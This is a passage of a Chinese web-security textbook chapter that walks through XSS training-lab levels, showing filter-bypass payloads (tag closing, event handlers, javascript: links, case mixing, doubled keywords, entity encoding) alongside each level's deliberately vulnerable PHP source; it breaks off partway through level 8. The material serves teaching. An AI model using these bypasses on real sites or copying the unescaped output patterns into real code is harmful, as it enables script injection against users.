+<a id="__codelineno-17-14" name="__codelineno-17-14" href="#__codelineno-17-14"></a>&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;
+<a id="__codelineno-17-15" name="__codelineno-17-15" href="#__codelineno-17-15"></a>&lt;?php 
+<a id="__codelineno-17-16" name="__codelineno-17-16" href="#__codelineno-17-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-17-17" name="__codelineno-17-17" href="#__codelineno-17-17"></a>$str = $_GET["name"];
+<a id="__codelineno-17-18" name="__codelineno-17-18" href="#__codelineno-17-18"></a>echo "&lt;h2 align=center&gt;欢迎用户".$str."&lt;/h2&gt;";  // 直接将 $str 拼接到了标签中导致存在漏洞
+<a id="__codelineno-17-19" name="__codelineno-17-19" href="#__codelineno-17-19"></a>?&gt;
+<a id="__codelineno-17-20" name="__codelineno-17-20" href="#__codelineno-17-20"></a>&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
+<a id="__codelineno-17-21" name="__codelineno-17-21" href="#__codelineno-17-21"></a>&lt;?php 
+<a id="__codelineno-17-22" name="__codelineno-17-22" href="#__codelineno-17-22"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str)."&lt;/h3&gt;";
+<a id="__codelineno-17-23" name="__codelineno-17-23" href="#__codelineno-17-23"></a>?&gt;
+<a id="__codelineno-17-24" name="__codelineno-17-24" href="#__codelineno-17-24"></a>&lt;/body&gt;
+<a id="__codelineno-17-25" name="__codelineno-17-25" href="#__codelineno-17-25"></a>&lt;/html&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-3.md -->
+<h3 id="_7">闭合绕过<a class="headerlink" href="#_7" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第二关</strong></p>
+<p>直接输入上一关 payload 没有执行</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6813800158cb8da5c8d636a3.png"></p>
+<p>查看页面源代码发现被插入到了 <code>value</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6813806258cb8da5c8d636af.png"></p>
+<p>尝试闭合掉 <code>input</code> 标签及后面的 <code>"&gt;</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>"&gt;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">()&lt;/</span><span class="nt">script</span><span class="p">&gt;</span><span class="err">&lt;</span>"
+</code></pre></div>
+<p>成功弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681380f758cb8da5c8d636ee.png"></p>
+<p>看一下源码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>&lt;head&gt;
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>&lt;script&gt;
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>window.alert = function()  
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a>{     
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>confirm("完成的不错！");
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a> window.location.href="level3.php?writing=wait"; 
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a>}
+<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a>&lt;/script&gt;
+<a id="__codelineno-19-11" name="__codelineno-19-11" href="#__codelineno-19-11"></a>&lt;title&gt;欢迎来到level2&lt;/title&gt;
+<a id="__codelineno-19-12" name="__codelineno-19-12" href="#__codelineno-19-12"></a>&lt;/head&gt;
+<a id="__codelineno-19-13" name="__codelineno-19-13" href="#__codelineno-19-13"></a>&lt;body&gt;
+<a id="__codelineno-19-14" name="__codelineno-19-14" href="#__codelineno-19-14"></a>&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;
+<a id="__codelineno-19-15" name="__codelineno-19-15" href="#__codelineno-19-15"></a>&lt;?php 
+<a id="__codelineno-19-16" name="__codelineno-19-16" href="#__codelineno-19-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-19-17" name="__codelineno-19-17" href="#__codelineno-19-17"></a>$str = $_GET["keyword"];
+<a id="__codelineno-19-18" name="__codelineno-19-18" href="#__codelineno-19-18"></a>// htmlspecialchars()：转义 &amp; " ' &lt; &gt;
+<a id="__codelineno-19-19" name="__codelineno-19-19" href="#__codelineno-19-19"></a>echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
+<a id="__codelineno-19-20" name="__codelineno-19-20" href="#__codelineno-19-20"></a>&lt;form action=level2.php method=GET&gt;
+<a id="__codelineno-19-21" name="__codelineno-19-21" href="#__codelineno-19-21"></a>&lt;input name=keyword  value="'.$str.'"
+<a id="__codelineno-19-22" name="__codelineno-19-22" href="#__codelineno-19-22"></a>&lt;input type=submit name=submit value="搜索"/&gt;
+<a id="__codelineno-19-23" name="__codelineno-19-23" href="#__codelineno-19-23"></a>&lt;/form&gt;
+<a id="__codelineno-19-24" name="__codelineno-19-24" href="#__codelineno-19-24"></a>&lt;/center&gt;';     // 这一段直接将 $str 拼接到了 value 中导致存在漏洞
+<a id="__codelineno-19-25" name="__codelineno-19-25" href="#__codelineno-19-25"></a>?&gt;
+<a id="__codelineno-19-26" name="__codelineno-19-26" href="#__codelineno-19-26"></a>&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;
+<a id="__codelineno-19-27" name="__codelineno-19-27" href="#__codelineno-19-27"></a>&lt;?php 
+<a id="__codelineno-19-28" name="__codelineno-19-28" href="#__codelineno-19-28"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str)."&lt;/h3&gt;";
+<a id="__codelineno-19-29" name="__codelineno-19-29" href="#__codelineno-19-29"></a>?&gt;
+<a id="__codelineno-19-30" name="__codelineno-19-30" href="#__codelineno-19-30"></a>&lt;/body&gt;
+<a id="__codelineno-19-31" name="__codelineno-19-31" href="#__codelineno-19-31"></a>&lt;/html&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-4.md -->
+<h3 id="_8">事件绕过<a class="headerlink" href="#_8" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第三关</strong></p>
+<p>使用上一关的 payload 发现也被转义了</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681382b758cb8da5c8d63762.png"></p>
+<p>这里我们可以利用事件绕过，事件主要存在于一些标签的属性内部</p>
+<p>还是要闭合下 <code>value</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>'onclick=javascript:alert()'    <span class="cm">&lt;!-- 点击事件 --&gt;</span>
+</code></pre></div>
+<p>提交后可以看到 <code>input</code> 标签中多了个 <code>onclick</code> 事件</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681383eb58cb8da5c8d6379e.png"></p>
+<p>这个时候我们在点击这个 <code>input</code> 即可弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6813842958cb8da5c8d637b2.png"></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>&lt;head&gt;
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a>&lt;script&gt;
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a>window.alert = function()  
+<a id="__codelineno-21-6" name="__codelineno-21-6" href="#__codelineno-21-6"></a>{     
+<a id="__codelineno-21-7" name="__codelineno-21-7" href="#__codelineno-21-7"></a>confirm("完成的不错！");
+<a id="__codelineno-21-8" name="__codelineno-21-8" href="#__codelineno-21-8"></a> window.location.href="level4.php?keyword=try harder!"; 
+<a id="__codelineno-21-9" name="__codelineno-21-9" href="#__codelineno-21-9"></a>}
+<a id="__codelineno-21-10" name="__codelineno-21-10" href="#__codelineno-21-10"></a>&lt;/script&gt;
+<a id="__codelineno-21-11" name="__codelineno-21-11" href="#__codelineno-21-11"></a>&lt;title&gt;欢迎来到level3&lt;/title&gt;
+<a id="__codelineno-21-12" name="__codelineno-21-12" href="#__codelineno-21-12"></a>&lt;/head&gt;
+<a id="__codelineno-21-13" name="__codelineno-21-13" href="#__codelineno-21-13"></a>&lt;body&gt;
+<a id="__codelineno-21-14" name="__codelineno-21-14" href="#__codelineno-21-14"></a>&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
+<a id="__codelineno-21-15" name="__codelineno-21-15" href="#__codelineno-21-15"></a>&lt;?php 
+<a id="__codelineno-21-16" name="__codelineno-21-16" href="#__codelineno-21-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-21-17" name="__codelineno-21-17" href="#__codelineno-21-17"></a>$str = $_GET["keyword"];
+<a id="__codelineno-21-18" name="__codelineno-21-18" href="#__codelineno-21-18"></a>echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;"."&lt;center&gt;
+<a id="__codelineno-21-19" name="__codelineno-21-19" href="#__codelineno-21-19"></a>&lt;form action=level3.php method=GET&gt;
+<a id="__codelineno-21-20" name="__codelineno-21-20" href="#__codelineno-21-20"></a>&lt;input name=keyword  value='".htmlspecialchars($str)."'&gt;    
+<a id="__codelineno-21-21" name="__codelineno-21-21" href="#__codelineno-21-21"></a>&lt;input type=submit name=submit value=搜索 /&gt;
+<a id="__codelineno-21-22" name="__codelineno-21-22" href="#__codelineno-21-22"></a>&lt;/form&gt;
+<a id="__codelineno-21-23" name="__codelineno-21-23" href="#__codelineno-21-23"></a>&lt;/center&gt;";
+<a id="__codelineno-21-24" name="__codelineno-21-24" href="#__codelineno-21-24"></a>?&gt;
+<a id="__codelineno-21-25" name="__codelineno-21-25" href="#__codelineno-21-25"></a>&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
+<a id="__codelineno-21-26" name="__codelineno-21-26" href="#__codelineno-21-26"></a>&lt;?php 
+<a id="__codelineno-21-27" name="__codelineno-21-27" href="#__codelineno-21-27"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str)."&lt;/h3&gt;";
+<a id="__codelineno-21-28" name="__codelineno-21-28" href="#__codelineno-21-28"></a>?&gt;
+<a id="__codelineno-21-29" name="__codelineno-21-29" href="#__codelineno-21-29"></a>&lt;/body&gt;
+<a id="__codelineno-21-30" name="__codelineno-21-30" href="#__codelineno-21-30"></a>&lt;/html&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-5.md -->
+<h3 id="a-href">a href 绕过<a class="headerlink" href="#a-href" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第五关</strong></p>
+<p>使用上一关 payload 发现 <code>on</code> 被替换为了 <code>o_n</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681385b858cb8da5c8d63814.png"></p>
+<p>这下基本上大部分事件函数都不能用了</p>
+<p>换一下思路尝试注入一个 <code>a</code> 标签试试，可以在其 <code>href</code> 属性中插入 JS 代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>"&gt;&lt;a href=javascript:alert()&gt;雾島风起時&lt;/a&gt;&lt;"
+</code></pre></div>
+<p>点击标签后弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6813872c58cb8da5c8d6386b.png"></p>
+<p>看一下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>&lt;head&gt;
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a>&lt;script&gt;
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a>window.alert = function()  
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a>{     
+<a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a>confirm("完成的不错！");
+<a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a> window.location.href="level6.php?keyword=break it out!"; 
+<a id="__codelineno-23-9" name="__codelineno-23-9" href="#__codelineno-23-9"></a>}
+<a id="__codelineno-23-10" name="__codelineno-23-10" href="#__codelineno-23-10"></a>&lt;/script&gt;
+<a id="__codelineno-23-11" name="__codelineno-23-11" href="#__codelineno-23-11"></a>&lt;title&gt;欢迎来到level5&lt;/title&gt;
+<a id="__codelineno-23-12" name="__codelineno-23-12" href="#__codelineno-23-12"></a>&lt;/head&gt;
+<a id="__codelineno-23-13" name="__codelineno-23-13" href="#__codelineno-23-13"></a>&lt;body&gt;
+<a id="__codelineno-23-14" name="__codelineno-23-14" href="#__codelineno-23-14"></a>&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
+<a id="__codelineno-23-15" name="__codelineno-23-15" href="#__codelineno-23-15"></a>&lt;?php 
+<a id="__codelineno-23-16" name="__codelineno-23-16" href="#__codelineno-23-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-23-17" name="__codelineno-23-17" href="#__codelineno-23-17"></a>$str = strtolower($_GET["keyword"]);
+<a id="__codelineno-23-18" name="__codelineno-23-18" href="#__codelineno-23-18"></a>$str2=str_replace("&lt;script","&lt;scr_ipt",$str);
+<a id="__codelineno-23-19" name="__codelineno-23-19" href="#__codelineno-23-19"></a>$str3=str_replace("on","o_n",$str2);    // 做了替换
+<a id="__codelineno-23-20" name="__codelineno-23-20" href="#__codelineno-23-20"></a>echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
+<a id="__codelineno-23-21" name="__codelineno-23-21" href="#__codelineno-23-21"></a>&lt;form action=level5.php method=GET&gt;
+<a id="__codelineno-23-22" name="__codelineno-23-22" href="#__codelineno-23-22"></a>&lt;input name=keyword  value="'.$str3.'"&gt;
+<a id="__codelineno-23-23" name="__codelineno-23-23" href="#__codelineno-23-23"></a>&lt;input type=submit name=submit value=搜索 /&gt;
+<a id="__codelineno-23-24" name="__codelineno-23-24" href="#__codelineno-23-24"></a>&lt;/form&gt;
+<a id="__codelineno-23-25" name="__codelineno-23-25" href="#__codelineno-23-25"></a>&lt;/center&gt;';
+<a id="__codelineno-23-26" name="__codelineno-23-26" href="#__codelineno-23-26"></a>?&gt;
+<a id="__codelineno-23-27" name="__codelineno-23-27" href="#__codelineno-23-27"></a>&lt;center&gt;&lt;img src=level5.png&gt;&lt;/center&gt;
+<a id="__codelineno-23-28" name="__codelineno-23-28" href="#__codelineno-23-28"></a>&lt;?php 
+<a id="__codelineno-23-29" name="__codelineno-23-29" href="#__codelineno-23-29"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str3)."&lt;/h3&gt;";
+<a id="__codelineno-23-30" name="__codelineno-23-30" href="#__codelineno-23-30"></a>?&gt;
+<a id="__codelineno-23-31" name="__codelineno-23-31" href="#__codelineno-23-31"></a>&lt;/body&gt;
+<a id="__codelineno-23-32" name="__codelineno-23-32" href="#__codelineno-23-32"></a>&lt;/html&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-6.md -->
+<h3 id="_9">大小写绕过<a class="headerlink" href="#_9" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第六关</strong></p>
+<p>继续使用上一关的 payload 发现 <code>href</code> 被过滤了</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/6813881f58cb8da5c8d638a3.png"></p>
+<p>尝试大小写混淆</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>"&gt;&lt;a hRef=javascript:alert()&gt;雾島风起時&lt;/a&gt;&lt;"
+</code></pre></div>
+<p>点击后弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681388a058cb8da5c8d638c7.png"></p>
+<p>看一下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>&lt;head&gt;
+<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>&lt;script&gt;
+<a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>window.alert = function()  
+<a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>{     
+<a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>confirm("完成的不错！");
+<a id="__codelineno-25-8" name="__codelineno-25-8" href="#__codelineno-25-8"></a> window.location.href="level7.php?keyword=move up!"; 
+<a id="__codelineno-25-9" name="__codelineno-25-9" href="#__codelineno-25-9"></a>}
+<a id="__codelineno-25-10" name="__codelineno-25-10" href="#__codelineno-25-10"></a>&lt;/script&gt;
+<a id="__codelineno-25-11" name="__codelineno-25-11" href="#__codelineno-25-11"></a>&lt;title&gt;欢迎来到level6&lt;/title&gt;
+<a id="__codelineno-25-12" name="__codelineno-25-12" href="#__codelineno-25-12"></a>&lt;/head&gt;
+<a id="__codelineno-25-13" name="__codelineno-25-13" href="#__codelineno-25-13"></a>&lt;body&gt;
+<a id="__codelineno-25-14" name="__codelineno-25-14" href="#__codelineno-25-14"></a>&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
+<a id="__codelineno-25-15" name="__codelineno-25-15" href="#__codelineno-25-15"></a>&lt;?php 
+<a id="__codelineno-25-16" name="__codelineno-25-16" href="#__codelineno-25-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-25-17" name="__codelineno-25-17" href="#__codelineno-25-17"></a>$str = $_GET["keyword"];
+<a id="__codelineno-25-18" name="__codelineno-25-18" href="#__codelineno-25-18"></a>$str2=str_replace("&lt;script","&lt;scr_ipt",$str);
+<a id="__codelineno-25-19" name="__codelineno-25-19" href="#__codelineno-25-19"></a>$str3=str_replace("on","o_n",$str2);    
+<a id="__codelineno-25-20" name="__codelineno-25-20" href="#__codelineno-25-20"></a>$str4=str_replace("src","sr_c",$str3);  
+<a id="__codelineno-25-21" name="__codelineno-25-21" href="#__codelineno-25-21"></a>$str5=str_replace("data","da_ta",$str4);
+<a id="__codelineno-25-22" name="__codelineno-25-22" href="#__codelineno-25-22"></a>$str6=str_replace("href","hr_ef",$str5);    // 只匹配 href，区分大小写
+<a id="__codelineno-25-23" name="__codelineno-25-23" href="#__codelineno-25-23"></a>echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
+<a id="__codelineno-25-24" name="__codelineno-25-24" href="#__codelineno-25-24"></a>&lt;form action=level6.php method=GET&gt;
+<a id="__codelineno-25-25" name="__codelineno-25-25" href="#__codelineno-25-25"></a>&lt;input name=keyword  value="'.$str6.'"&gt;
+<a id="__codelineno-25-26" name="__codelineno-25-26" href="#__codelineno-25-26"></a>&lt;input type=submit name=submit value=搜索 /&gt;
+<a id="__codelineno-25-27" name="__codelineno-25-27" href="#__codelineno-25-27"></a>&lt;/form&gt;
+<a id="__codelineno-25-28" name="__codelineno-25-28" href="#__codelineno-25-28"></a>&lt;/center&gt;';
+<a id="__codelineno-25-29" name="__codelineno-25-29" href="#__codelineno-25-29"></a>?&gt;
+<a id="__codelineno-25-30" name="__codelineno-25-30" href="#__codelineno-25-30"></a>&lt;center&gt;&lt;img src=level6.png&gt;&lt;/center&gt;
+<a id="__codelineno-25-31" name="__codelineno-25-31" href="#__codelineno-25-31"></a>&lt;?php 
+<a id="__codelineno-25-32" name="__codelineno-25-32" href="#__codelineno-25-32"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str6)."&lt;/h3&gt;";
+<a id="__codelineno-25-33" name="__codelineno-25-33" href="#__codelineno-25-33"></a>?&gt;
+<a id="__codelineno-25-34" name="__codelineno-25-34" href="#__codelineno-25-34"></a>&lt;/body&gt;
+<a id="__codelineno-25-35" name="__codelineno-25-35" href="#__codelineno-25-35"></a>&lt;/html&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-7.md -->
+<h3 id="_10">双写绕过<a class="headerlink" href="#_10" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第七关</strong></p>
+<p>继续使用上一关的 payload 发现整个 <code>hRef</code> 被删除以及删除了 <code>script</code></p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/681389a158cb8da5c8d63901.png"></p>
+<p>推测是不区分大小写，尝试双写关键字</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>"&gt; &lt;a hRhRefef=javascrscriptipt:alert()&gt;雾島风起時&lt;/a&gt; &lt;"
+</code></pre></div>
+<p>点击后弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68138a8a58cb8da5c8d63973.png"></p>
+<p>看一下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>&lt;head&gt;
+<a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a>&lt;script&gt;
+<a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a>window.alert = function()  
+<a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>{     
+<a id="__codelineno-27-7" name="__codelineno-27-7" href="#__codelineno-27-7"></a>confirm("完成的不错！");
+<a id="__codelineno-27-8" name="__codelineno-27-8" href="#__codelineno-27-8"></a> window.location.href="level8.php?keyword=nice try!"; 
+<a id="__codelineno-27-9" name="__codelineno-27-9" href="#__codelineno-27-9"></a>}
+<a id="__codelineno-27-10" name="__codelineno-27-10" href="#__codelineno-27-10"></a>&lt;/script&gt;
+<a id="__codelineno-27-11" name="__codelineno-27-11" href="#__codelineno-27-11"></a>&lt;title&gt;欢迎来到level7&lt;/title&gt;
+<a id="__codelineno-27-12" name="__codelineno-27-12" href="#__codelineno-27-12"></a>&lt;/head&gt;
+<a id="__codelineno-27-13" name="__codelineno-27-13" href="#__codelineno-27-13"></a>&lt;body&gt;
+<a id="__codelineno-27-14" name="__codelineno-27-14" href="#__codelineno-27-14"></a>&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;
+<a id="__codelineno-27-15" name="__codelineno-27-15" href="#__codelineno-27-15"></a>&lt;?php 
+<a id="__codelineno-27-16" name="__codelineno-27-16" href="#__codelineno-27-16"></a>ini_set("display_errors", 0);
+<a id="__codelineno-27-17" name="__codelineno-27-17" href="#__codelineno-27-17"></a>$str =strtolower( $_GET["keyword"]);
+<a id="__codelineno-27-18" name="__codelineno-27-18" href="#__codelineno-27-18"></a>$str2=str_replace("script","",$str);
+<a id="__codelineno-27-19" name="__codelineno-27-19" href="#__codelineno-27-19"></a>$str3=str_replace("on","",$str2);
+<a id="__codelineno-27-20" name="__codelineno-27-20" href="#__codelineno-27-20"></a>$str4=str_replace("src","",$str3);
+<a id="__codelineno-27-21" name="__codelineno-27-21" href="#__codelineno-27-21"></a>$str5=str_replace("data","",$str4);
+<a id="__codelineno-27-22" name="__codelineno-27-22" href="#__codelineno-27-22"></a>$str6=str_replace("href","",$str5);
+<a id="__codelineno-27-23" name="__codelineno-27-23" href="#__codelineno-27-23"></a>echo "&lt;h2 align=center&gt;没有找到和".htmlspecialchars($str)."相关的结果.&lt;/h2&gt;".'&lt;center&gt;
+<a id="__codelineno-27-24" name="__codelineno-27-24" href="#__codelineno-27-24"></a>&lt;form action=level7.php method=GET&gt;
+<a id="__codelineno-27-25" name="__codelineno-27-25" href="#__codelineno-27-25"></a>&lt;input name=keyword  value="'.$str6.'"&gt;
+<a id="__codelineno-27-26" name="__codelineno-27-26" href="#__codelineno-27-26"></a>&lt;input type=submit name=submit value=搜索 /&gt;
+<a id="__codelineno-27-27" name="__codelineno-27-27" href="#__codelineno-27-27"></a>&lt;/form&gt;
+<a id="__codelineno-27-28" name="__codelineno-27-28" href="#__codelineno-27-28"></a>&lt;/center&gt;';
+<a id="__codelineno-27-29" name="__codelineno-27-29" href="#__codelineno-27-29"></a>?&gt;
+<a id="__codelineno-27-30" name="__codelineno-27-30" href="#__codelineno-27-30"></a>&lt;center&gt;&lt;img src=level7.png&gt;&lt;/center&gt;
+<a id="__codelineno-27-31" name="__codelineno-27-31" href="#__codelineno-27-31"></a>&lt;?php 
+<a id="__codelineno-27-32" name="__codelineno-27-32" href="#__codelineno-27-32"></a>echo "&lt;h3 align=center&gt;payload的长度:".strlen($str6)."&lt;/h3&gt;";
+<a id="__codelineno-27-33" name="__codelineno-27-33" href="#__codelineno-27-33"></a>?&gt;
+<a id="__codelineno-27-34" name="__codelineno-27-34" href="#__codelineno-27-34"></a>&lt;/body&gt;
+<a id="__codelineno-27-35" name="__codelineno-27-35" href="#__codelineno-27-35"></a>&lt;/html&gt;
+</code></pre></div>
+<!-- Imported from D:\\Book\\Web\\Chapter9\9-8.md -->
+<h3 id="unicode">Unicode 编码绕过<a class="headerlink" href="#unicode" title="Permanent link">¶</a></h3>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68137e9a58cb8da5c8d635fa.png"></p>
+<p><strong>第八关</strong></p>
+<p>这一关是直接将我们的值插入到 <code>href</code> 属性内，试过了前几种方法都不管用</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68138b8b58cb8da5c8d639d6.png"></p>
+<p>但是我们能利用 <code>href</code> 的隐藏属性自动 Unicode 解码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="ni">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#41;</span>
+</code></pre></div>
+<p>点击后弹窗</p>
+<p><img alt="" src="https://pic1.imgdb.cn/item/68138bea58cb8da5c8d63a22.png"></p>
+<p>看一下源代码</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>&lt;head&gt;
+<a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>&lt;meta http-equiv="content-type" content="text/html;charset=utf-8"&gt;
+<a id="__codelineno-29-4" name="__codelineno-29-4" href="#__codelineno-29-4"></a>&lt;script&gt;
+<a id="__codelineno-29-5" name="__codelineno-29-5" href="#__codelineno-29-5"></a>window.alert = function()  
+<a id="__codelineno-29-6" name="__codelineno-29-6" href="#__codelineno-29-6"></a>{     
+<a id="__codelineno-29-7" name="__codelineno-29-7" href="#__codelineno-29-7"></a>confirm("完成的不错！");
+<a id="__codelineno-29-8" name="__codelineno-29-8" href="#__codelineno-29-8"></a> window.location.href="level9.php?keyword=not bad!"; 
+<a id="__codelineno-29-9" name="__codelineno-29-9" href="#__codelineno-29-9"></a>}
+<a id="__codelineno-29-10" name="__codelineno-29-10" href="#__codelineno-29-10"></a>&lt;/script&gt;
+<a id="__codelineno-29-11" name="__codelineno-29-11" href="#__codelineno-29-11"></a>&lt;title&gt;欢迎来到level8&lt;/title&gt;
+<a id="__codelineno-29-12" name="__codelineno-29-12" href="#__codelineno-29-12"></a>&lt;/head&gt;
